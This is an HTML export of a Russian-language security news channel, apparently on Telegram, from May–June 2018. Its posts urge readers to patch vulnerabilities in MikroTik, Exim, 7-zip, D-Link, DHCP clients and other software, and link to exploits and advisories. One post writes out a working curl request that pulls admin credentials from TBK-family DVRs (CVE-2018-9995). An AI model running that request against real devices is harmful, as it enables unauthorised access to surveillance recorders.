<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Совсем недавно обновляли MicroTik и вот опять! В версиях RouterOS до v6.42.1 и v6.43rc4 новая уязвимость, поволяющая стянуть базу данных пользователей с роутера и авторизоваться на нем. Эксплойта доступного нет, но у кого-то он точно есть, потому что случаи успешной эксплуатации засечены в сети.<br><br>&quot;MikroTik says the zero-day vulnerability affected all RouterOS versions released since v6.29.&quot;<br><br>Атаки, которые наблюдались, проводились через сервис Winbox (порт 8291). Можно бы просто ограничить к нему доступ, но открытых данных об уязвимости очень мало, поэтому в данном случае предпочтительнее все же обновить версию.
       </div>

      </div>

     </div>

     <div class="message service" id="message-147">

      <div class="body details">
3 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message165">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="03.05.2018 13:24:34">
13:24
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;exim&quot;)">#exim</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>&quot;у Exim прекрасная история безопасности&quot; (wiki)<br><br>И все же теперь существует RCE эксплойтик для версий до 4.90.1: <a href="https://packetstormsecurity.com/files/147456/eximbase64d-exec.txt">https://packetstormsecurity.com/files/147456/eximbase64d-exec.txt</a><br><br>Подробности про путь эксплуатации можно тут почитать: <a href="https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/">https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</a><br><br>Речь про уязвимость CVE-2018-6789 переполнения буфера в функции base64d(), используемой в Exim при обработке входных данных SMTP. Уязвимость присутствует с первых версий и вплоть до 4.90.1 (не включительно). Но сейчас уже 4.91 актуальная версия, так что можно (и нужно) обновляться сразу до нее.
       </div>

      </div>

     </div>

     <div class="message service" id="message-148">

      <div class="body details">
4 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message166">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="04.05.2018 13:40:38">
13:40
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;7zip&quot;)">#7zip</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Вот теперь и RAR-архивы открывать небезопасно. В 7-zip нашли уязвимость в функционале обработки RAR-архивов, а именно - возможность передачи небезопасных параметров распаковщику в результате недостаточной их проверки. Впрочем, если интересны подробности (а также путь эксплуатации) - это вот тут: <a href="https://landave.io/2018/05/7-zip-from-uninitialized-memory-to-remote-code-execution/">https://landave.io/2018/05/7-zip-from-uninitialized-memory-to-remote-code-execution/</a>. А по сути - можно получить RCE, просто открыв RAR с помощью 7-zip.<br><br>К счастью, знаем мы про эту уязвимость, потому что патч уже выпущен. В версии 18.05 7-zip <a href="https://www.7-zip.org/">https://www.7-zip.org/</a>. Остается только поднапрячься да обновить, ведь сама то эта штука не обновляется.
       </div>

      </div>

     </div>

     <div class="message service" id="message-149">

      <div class="body details">
8 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message167">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="08.05.2018 13:34:14">
13:34
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Немного вернемся к вопросу с 7zip. В данном случае хотя софтина и не обновляется сама, можно использовать пакет msi и групповые политики для централизованного обновления. <br><br>Пакет msi доступен в готовом виде на официальном сайте. Его надо выложить в расшаренную сетевую папочку. Если папка предполагается целенаправленно для распространения софта, то разумно установить к ней права доступа на чтения для всех, а на запись/изменение и прочие - только для доверенных администраторов.<br><br>В групповой политике установка софта настраивается в Computer Configuration -&gt; Software Settings -&gt; Software installation, правой кнопкой по Software Installation и New -&gt; Package. Далее указать путь к пакету msi и при желании задать Advanced параметры для установки.<br><br>Это все для централизованной установки. При необходимости переустановки (обновления, например) в том же разделе Computer Configuration -&gt; Software Settings -&gt; Software installation справа в списке пакетов правой кнопкой на конкретный пакет, Все задачи -&gt; Развернуть приложение заново. Усе.<br><br>Метод подходит для любых приложений с установщиком в формате msi, например, Adobe Flash Player (впрочем, удалите его уже к чертям), Adobe Reader, Java, Open Office, ну и вообще многа их.
       </div>

      </div>

     </div>

     <div class="message service" id="message-150">

      <div class="body details">
10 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message168">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="10.05.2018 08:57:21">
08:57
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;камеры&quot;)">#камеры</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><code>$&gt; curl &quot;http://&lt;dvr_host&gt;:&lt;port&gt;/device.rsp?opt=user&amp;cmd=list&quot; -H &quot;Cookie: uid=admin&quot;</code><br><br>Ага, легкий и странный способ получить пароль админа на видеорегистраторах TBK DVR4104 и DVR4216. Обозвали CVE-2018-9995. А еще и на производных/родственных CeNova, QSee, Pulnix, XVR 5 in 1, Night OWL, DVR Login, HVR Login, MDVR Login.<br><br>Про патчи пока не слыхать, но видеорегистраторы определенно не должны быть доступны из публичных сетей, кроме тех, которые должны.<br><br>Пара строк кода &quot;как это работает&quot; от исследователя: <a href="http://misteralfa-hack.blogspot.ru/2018/04/tbk-vision-dvr-login-bypass.html">http://misteralfa-hack.blogspot.ru/2018/04/tbk-vision-dvr-login-bypass.html</a><br>И немного про эксплуатацию: <a href="https://github.com/ezelf/CVE-2018-9995_dvr_credentials">https://github.com/ezelf/CVE-2018-9995_dvr_credentials</a><br>И скрипт, если лень веб-запрос писать: <a href="https://cxsecurity.com/issue/WLB-2018050019">https://cxsecurity.com/issue/WLB-2018050019</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-151">

      <div class="body details">
11 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message169">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="11.05.2018 09:10:53">
09:10
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;linux&quot;)">#linux</a> <a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;kernel&quot;)">#kernel</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Пятница - не время обновлять ядро линуксов. Однако можно морально к этому подготовиться.<br><br>Уязвимость CVE-2018-8897 также присутствуют в осях Windows (но эти обновятся сами), macOS (тоже), а еще DragonFly BSD, FreeBSD, Synology, VMware и Xen.<br><br><strong>Увлекательная лирика (стырено с www.opennet.ru):</strong><br><br><em>Причиной возникновения уязвимости является недостаточно ясная трактовка в официальной документации (&quot;System Programming Guide of the Intel 64 and IA-32&quot;) поведения MOV SS/POP SS при возникновении отладочных исключений (#DB). На системах x86 стек представлен комбинацией из сегмента стека (SS) и указателя позиции в стеке (SP), которые всегда должны быть синхронизированы для корректного выполнения операций. Инструкции, выполняющие манипуляции с сегментом стека, для блокирования рассинхронизации содержат специальный обработчик для обеспечения согласованности с изменением указателя стека.<br>Разработчики многих операционных систем полагали, что попадание инструкции MOV SS в точку останова приводит к генерации исключения #DB сразу после завершения MOV SS, но на деле исключение откладывается до границы следующей инструкции и вызывается только после выполнения инструкции, идущей следом за MOV SS. Если следом за MOV SS выполняется одна из инструкций, приводящих к переключению контекста и передаче управления операционной системе (SYSCALL, SYSENTER, INT $N, INT3, INTO), например, осуществляется системный вызов, то обработчик исключения #DB вызывается уже в контексте ядра, а не в контексте пользователя. Для решения проблемы в контексте ядра следовало очистить значение регистра DR6, определить обработчик #DB в стиле обработчика NMI или подменить стек при помощи IST (Interrupt Stack Table).</em><br><br>SUSE оценивает CVSS уязвимости в 7 и видит угрозу и конфиденциальности, и целостности, и доступности. Red Hat - 6.5 и только доступность. Debian предупреждает о возможности повышения привилегий и DoS.<br><br><strong>Апдейты:</strong><br><br>Debian - <a href="https://security-tracker.debian.org/tracker/CVE-2018-8897">https://security-tracker.debian.org/tracker/CVE-2018-8897</a><br>Red Hat - <a href="https://access.redhat.com/security/vulnerabilities/pop_ss">https://access.redhat.com/security/vulnerabilities/pop_ss</a><br>OpenSUSE - <a href="https://lists.opensuse.org/opensuse-security-announce/2018-05/msg00006.html">https://lists.opensuse.org/opensuse-security-announce/2018-05/msg00006.html</a>, <a href="https://lists.opensuse.org/opensuse-security-announce/2018-05/msg00007.html">https://lists.opensuse.org/opensuse-security-announce/2018-05/msg00007.html</a>, <a href="https://lists.opensuse.org/opensuse-security-announce/2018-05/msg00008.html">https://lists.opensuse.org/opensuse-security-announce/2018-05/msg00008.html</a><br>SUSE - <a href="https://www.suse.com/security/cve/CVE-2018-8897/">https://www.suse.com/security/cve/CVE-2018-8897/</a><br>Ubuntu - <a href="https://usn.ubuntu.com/3641-1/">https://usn.ubuntu.com/3641-1/</a>, <a href="https://usn.ubuntu.com/3641-2/">https://usn.ubuntu.com/3641-2/</a><br>FreeBSD - <a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-18:06.debugreg.asc">https://www.freebsd.org/security/advisories/FreeBSD-SA-18:06.debugreg.asc</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-152">

      <div class="body details">
14 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message170">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="14.05.2018 10:14:06">
10:14
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;junos&quot;)">#junos</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a> <a href="" onclick="return ShowHashtag(&quot;уязвимости&quot;)">#уязвимости</a><br><br><strong>Виды шифрования паролей пользователей в JunOS:</strong><br><br>$1$ - MD5 с солью по формату crypt FreeBSD<br>$5$ - SHA256, доступен с версии 15.1<br>$6$ - SHA512, доступен с версии 17.2<br>$9$ - а это и не шифрование вовсе, а суммирование с фиксированной строкой, так что получить пароль можно за секунды<br><br>Понятно, что $9$ использовать категорически нельзя. Остальные в порядке предпочтительности: 6, 5, 1. Но главное - использовать сложные пароли, не входящие в словари.<br><br><strong>Интересные из последних уязвимостей JunOS:</strong><br><br>CVE-2018-0001 - CVSS 7.5 - внедрение кода через веб-интерфейс - актуально для 12.1X46 до 12.1X46-D67; 12.3 до 12.3R12-S5; 12.3X48 до 12.3X48-D35; 14.1 до 14.1R8-S5, 14.1R9; 14.1X53 до 14.1X53-D44, 14.1X53-D50; 14.2 до 14.2R7-S7, 14.2R8; 15.1 до 15.1R3; 15.1X49 до 15.1X49-D30; 15.1X53 до 15.1X53-D70<br><br>CVE-2018-0007 - CVSS 10 - DoS и повышение привилегий через LLDP-сообщений - актуально для 12.1X46 до 12.1X46-D71; 12.3 до 12.3R12-S7; 12.3X48 до 12.3X48-D55; 14.1 до 14.1R8-S5, 14.1R9; 14.1X53 до 14.1X53-D46, 14.1X53-D50, 14.1X53-D107; 14.2 до 14.2R7-S9, 14.2R8; 15.1 до 15.1F2-S17, 15.1F5-S8, 15.1F6-S8, 15.1R5-S7, 15.1R7; 15.1X49 до 15.1X49-D90; 15.1X53 до 15.1X53-D65; 16.1 до 16.1R4-S6, 16.1R5; 16.1X65 до 16.1X65-D45; 16.2 до 16.2R2; 17.1 до 17.1R2<br><br>CVE-2018-0008 - CVSS 7.2 - Повышение привилегий через перезагрузку с последующим локальным консольным подключением - актуально для 12.1X46 до 12.1X46-D71 на SRX; 12.3X48 до 12.3X48-D55 на SRX; 14.1 до 14.1R9; 14.1X53 до 14.1X53-D40 на QFX, EX; 14.2 до 14.2R7-S9, 14.2R8; 15.1 до 15.1F5-S7, 15.1F6-S8, 15.1R5-S6, 15.1R6; 15.1X49 до 15.1X49-D110 на SRX; 15.1X53 до 15.1X53-D232 на QFX5200/5110; 15.1X53 до 15.1X53-D49, 15.1X53-D470 на NFX; 15.1X53 до 15.1X53-D65 на QFX10K; 16.1 до 16.1R2<br><br>И еще ряд DoS.
       </div>

      </div>

     </div>

     <div class="message service" id="message-153">

      <div class="body details">
15 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message171">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="15.05.2018 10:45:27">
10:45
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>В популярном движке для интернет-магазинов osCommerce дефолтная конфигурация содержит возможность RCE. Если не удален каталог /install/, а конкретно скрипт install_4.php, неавторизованный клиент может воспользоваться им для создания файла конфигурации установки. А в него можно включить произвольный PHP-код и выполнить его потом.<br><br>Вот модуль для метасплойта под это дело накатали: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/oscommerce_installer_unauth_code_exec.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/oscommerce_installer_unauth_code_exec.rb</a> ...<br><br>Ну а защититься - понятно - удалить /install/ со всем его содержимым.
       </div>

      </div>

     </div>

     <div class="message service" id="message-154">

      <div class="body details">
16 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message172">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="16.05.2018 11:51:50">
11:51
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Время провести осмотр владений. Сегодня проверяем OpenSSH, OpenSSL, Apache и PHP<br><br>Собираем версии:<br><br><code>nmap -sS -p22,2222 -Pn -n -v -sV &lt;nets&gt;</code><br><code>nmap -sS -p80,443,8080,8088,8090,8443 -sV -Pn -n -v &lt;nets&gt;</code><br><br>OpenSSH::Последняя версия - 7.7. Однако в версиях 7.5 и 7.6 тоже нет существенных известных уязвимостей.<br><br>OpenSSL::Актуальные по безопасности версии OpenSSL на данный момент 1.1.0h и 1.0.2o. Но последняя &quot;High&quot; уязвимость была в начале 2017 года и ее закрывает патч 1.1.0e, а ветка 1.0.2 вообще ее не содержит. В ветке 1.0.2 последнюю &quot;High&quot; уязвимость закрывает патч 1.0.2i. Ветки 1.0.1, 1.0.0 и 0.9.8 устарели, не поддерживаются и не патчатся, давно.<br><br>Apache (HTTP Server)::Последняя версия - 2.4.33. Впрочем если версия 2.4.27 или выше, можно особо не беспокоиться.<br><br>PHP::Чтобы не проверять, используются ли уязвимые функции, и спать спокойно, нужны версии &quot;от и выше&quot; 5.6.36, 7.0.28, 7.1.15 и 7.2.3.
       </div>

      </div>

     </div>

     <div class="message service" id="message-155">

      <div class="body details">
17 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message173">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="17.05.2018 12:57:13">
12:57
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;linux&quot;)">#linux</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>&quot;your web proxy is at…ahh, heck, forget that, open up a remote shell for me instead&quot;<br><br>Вот эта жуткая CVE-2018-1111 в dhcp-client на Red Hat, Fedora и CentOS. Очень просто через опции DHCP внедряются команды с правами рута: <a href="https://twitter.com/Barknkilic/status/996470756283486209">https://twitter.com/Barknkilic/status/996470756283486209</a>.<br><br>Ссылки на списки обновленных пакетов для разных версий Red Hat: <a href="https://access.redhat.com/security/vulnerabilities/3442151">https://access.redhat.com/security/vulnerabilities/3442151</a><br><br>Обновление Fedora из репотизотория updates-testing (со дня на день включат в stable):<br><br><code>sudo dnf --refresh --enablerepo=updates-testing update dhcp-client</code><br><code>sudo dnf --refresh update dhcp-client</code><br><br>А для CentOS пропатченная версия - dhcp-4.2.5-68.el7_5.1 (<a href="https://git.centos.org/r/rpms/dhcp.git">https://git.centos.org/r/rpms/dhcp.git</a>)<br><br>Ну а кто DHCP Snooping настроил - тому и так спокойно.
       </div>

      </div>

     </div>

     <div class="message service" id="message-156">

      <div class="body details">
18 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message174">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="18.05.2018 11:13:09">
11:13
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;pgp&quot;)">#pgp</a> <a href="" onclick="return ShowHashtag(&quot;smime&quot;)">#smime</a><br><br>Драму вокруг PGP и S/MIME на этой недели развели из-за двух MITM уязвимостей. Для обеих нужен доступ к трафику или хотя бы содержание письма, чтобы отправить его получателю повторно.<br><br>Первая атака - внедрение в сообщение тега img или style, чтобы S/MIME шифртекст оказался внутри атрибута src. Тогда почтовый клиент перед обращением к src любезно расшифрует данные и отправит в открытом виде. Доступно в Apple Mail и iOS Mail прозрачно для пользователя, в PostBox, MailMate и Thunderbird - с участием пользователя.<br><br>Вторая атака - тоже внедрение тегов img/style, только уже внутрь шифртекста. Для подготовки блоков шифртекста используются блоки с известным содержимым и нулевые блоки. Уязвимы реализации S/MIME почти по всех клиентах и PGP в Outlook 2007 с GPG4Win, Thunderbird с Enigmail, Apple Mail c GPGTools, Roundcube. Правда PGP часто осуществляет сжатие данных, и тогда облом.<br><br>К защите пока требуется подойти творчески, но в первую очередь отключить поддержку HTML в почтовом клиенте.
       </div>

      </div>

     </div>

     <div class="message service" id="message-157">

      <div class="body details">
21 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message175">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="21.05.2018 11:21:46">
11:21
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;keeper&quot;)">#keeper</a> <a href="" onclick="return ShowHashtag(&quot;history&quot;)">#history</a> <a href="" onclick="return ShowHashtag(&quot;обновление&quot;)">#обновление</a><br><br>Владельцы популярного менеждера паролей Keeper свято клянутся, что доступ к данным может быть только у пользователя. Независимо от того, действительно ли это так. После публичного раскрытия (15 мая) инфы об уязвимости, они все таки взялись ее исправить (17 мая), а раньше было такое веселье (по рассказу ресечера):<br><br>Jan 9 Описание проблемы отправлено вендору, открыто общение с CTO<br>Jan 16 Запрошено обновление и контакты директоры по безопасности<br>Jan 26 Вендор в своем блоге пишет, что доступ к данным архитектурно может быть только у пользователя<br>Feb 1 Все почтовые сообщения CTO и директору по безопасности приводят к 550 ошибке SMTP (политика сервера блокирует сообщение)<br>Feb 6 Ресечер отправил сообщение на <a href="mailto:support@keepersecurity.com">support@keepersecurity.com</a> о проблеме с почтой, но не получил ответа<br>Mar 13 Вендор снова напоминает в блоге, что данные могут быть расшифрованы только на пользовательском устройстве<br>Apr 19 Ресечеру пришло сообщение с предложением подключиться к Bugcrowd. Его ответ был заблокирован с 550 ошибкой<br>Apr 21 Ресечер воспользовался чатом Keeper Security, но был отправлен решать проблему на <a href="mailto:support@keepersecurity.com">support@keepersecurity.com</a><br>Apr 21 Ресечер отправил сообщение на <a href="mailto:support@keepersecurity.com">support@keepersecurity.com</a>, но ответ не получил<br>May 11 Еще одна попытка написать по почте CTO и снова ошибка SMTP 550<br><br>Далее 15 мая ресечер опубликовал раскрытие уязвимости. Keeper Security написали в блоге, что в они курсе, но не могут связаться с ресечером для разъяснений (не поняли что ли чего-то?), потому что Google блэклистит переписку. 17 мая выкатили апдейт, он включен в версию 12.0.0.<br><br>Ну а сама то проблема, которая была, позволяла владельцу или админу API сервера получить ключ шифрования данных пользователя:<br><br>Явление 1: При аутентификации пользователя API сервер отсылает клиенту соль и параметры для подсчета хеша аутентификации. На стороне клиента из мастер-ключа с использованием этих параметров рассчитывается с помощью функции PBKDF2 с SHA256 32-байтовый хеш, который отправляется серверу.<br><br>Явление 2: Для расшифровки данных хранилища API сервер отсылает клиенту соль и параметры для подсчета промежуточного ключа. На стороне клиента из мастер-ключа (того же) с использованием полученных параметров рассчитывается с помощью функции PBKDF2 с SHA256 32-байтовый хеш, который используется в качестве промежуточного ключа (для расшифровки ключа шифрования данных).<br><br>Видно, что &quot;API сервер&quot; может получить промежуточный ключ расшифровки данных. И затем расшифровать ключ шифрования данных, который вообще хранится на стороне API сервера.<br><br>Собственно код: <a href="https://github.com/Keeper-Security/Commander/blob/master/keepercommander/api.py">https://github.com/Keeper-Security/Commander/blob/master/keepercommander/api.py</a><br>Раскрытие: <a href="http://seclists.org/fulldisclosure/2018/May/41">http://seclists.org/fulldisclosure/2018/May/41</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-158">

      <div class="body details">
22 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message176">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="22.05.2018 10:51:43">
10:51
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Чудеса от Длинка - DSL 3782 отслеживает сессию администратора не по кукам, не по данным в хранилищах на стороне клиента, и даже не по отпечатку браузера, а по таймауту! Причем, судя по отчету ресечера, еще и IP источника запросов не отслеживается. В итоге CVE-2018-8898: можно вот просто отправлять запросы с правами администратора. Примеры запросов в &quot;эксплойте&quot;: <a href="https://www.exploit-db.com/exploits/44657/">https://www.exploit-db.com/exploits/44657/</a>. Апдейтов нет пока...<br><br>И еще одна свежая бага там же (DSL 3782) - выполнение произвольного кода с правами root авторизованным HTTP-клиентом (CVE-2018-8941). PoC: <a href="https://github.com/SECFORCE/CVE-2018-8941">https://github.com/SECFORCE/CVE-2018-8941</a>. Для этого даже выкатили обновление: <a href="ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DSL-3782/REVA/">ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DSL-3782/REVA/</a><br><br>Ну а если у вас длинк есть, но другой, имеет смысл посмотреть последний релиз прошивки для конкретной модели: <a href="ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS">ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-159">

      <div class="body details">
23 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message177">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="23.05.2018 10:50:42">
10:50
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br><strong>Веселье с майнерами (RCE)</strong><br><br>Майнеры это вам не просто игрушки, в них тоже RCE бывает. Вот, например, 2018-1000049 в Nanopool Claymore Dual Miner. Все базы уязвимостей пишут &quot;версия 7.3 и ниже&quot;, но ресечер то явно дал знать: <em># Version: 7.3 and later</em>, видно слишком уж непривычно им это &quot;later&quot;. А последняя версия на данный момент 10.0.0 от 17 сентября 2017, так что и обновиться то нечем. Ботнеты уже взяли на вооружение.<br><br>Проблема на порту 3333, касается и Windows, и Linux, вот как работает сплойт: <a href="https://www.exploit-db.com/exploits/44638/">https://www.exploit-db.com/exploits/44638/</a>. Скоро допилят модуль для метасплойта.
       </div>

      </div>

     </div>

     <div class="message service" id="message-160">

      <div class="body details">
28 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message178">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="28.05.2018 10:38:47">
10:38
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br><strong>RCE через VBScript в IE 11 и MS Office</strong><br><br>Уязвимость CVE-2018-8174 в Windows VBScript Engine позволяет выполнить произвольный код с правами текущего пользователя. При выполнении кода visual basic, разумеется. Вот, например, модуль для метасплойта, чтобы создать doc файл с эксплойтом: <a href="https://github.com/0x09AL/CVE-2018-8174-msf">https://github.com/0x09AL/CVE-2018-8174-msf</a> (там есть ограничение - для 32-битного Microsoft Office). Или .html, который выполняет код при запуске через IE 11 на Windows 7: <a href="https://packetstormsecurity.com/files/147877/msie11vbscript-exec.txt">https://packetstormsecurity.com/files/147877/msie11vbscript-exec.txt</a>.<br><br>Разумеется, Microsoft уже выпустила апдейты, список номеров KB: <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8174">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8174</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-161">

      <div class="body details">
30 May 2018
      </div>

     </div>

     <div class="message default clearfix" id="message179">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="30.05.2018 10:42:47">
10:42
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;tools&quot;)">#tools</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br><strong>Microsoft Baseline Security Analyzer</strong><br><br>Главное, что эта сладенькая тулзина сделает, - покажет ВСЕ недостающие патчи безопасности (ну кстати и установленные тоже покажет). Актуальный список подгружается с серверов Windows Update или ваших WSUS. И еще она проверит ряд базовых настроек безопасности.<br><br>От XP до 8.1 и от 2003 до 2012 R2. А еще Office и SharePoint до 2013. 15 секунд на скачивание и установку, 10 минут на проверку. Можно дать админские креды и удаленно проверять сразу пачку тачек.<br><br>Download: <a href="https://www.microsoft.com/en-us/download/details.aspx?id=7558">https://www.microsoft.com/en-us/download/details.aspx?id=7558</a><br>Info: <a href="https://technet.microsoft.com/en-us/security/cc184924.aspx">https://technet.microsoft.com/en-us/security/cc184924.aspx</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-162">

      <div class="body details">
1 June 2018
      </div>

     </div>

     <div class="message default clearfix" id="message180">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="01.06.2018 10:47:52">
10:47
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
